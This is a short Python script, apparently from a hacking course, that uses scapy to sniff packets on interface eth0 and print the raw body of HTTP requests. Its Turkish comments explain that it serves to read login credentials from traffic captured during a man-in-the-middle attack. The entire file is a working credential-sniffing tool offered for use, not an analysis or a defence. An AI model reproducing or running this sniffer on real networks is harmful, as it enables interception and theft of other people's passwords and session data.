import scapy.all as scapy
from scapy_http import http

def listen_packets(interface):

    scapy.sniff(iface=interface,store=False,prn=analyze_packets)    # store kısmı, alınan paketleri hafızaya kaydetmeyi sağlar biz kaydetmedik. prn, paketin nereye yollanacağını gösterir.
    #prn = callback function

def analyze_packets(packet):
    #packet.show()
    if packet.haslayer(http.HTTPRequest):        # MITM olup snifflediğimiz zaman giriş bilgileri http altındaki http request kısmının altındaki raw kısmının load bölgesinde yer aldığı için,
        if packet.haslayer(scapy.Raw):           # biz de gereksiz diğer bilgileri terminalde görmemek için sadece o katmanları filtreleyip net bir şekilde bilgileri görmeyi sağladık burda.
            print(packet[scapy.Raw].load)        # haslayer kısmı, onu kullanıp parantez içine yazdığımız katman varsa öyle bir katmanın varlığında çalışması anlamına gelir.

listen_packets("eth0")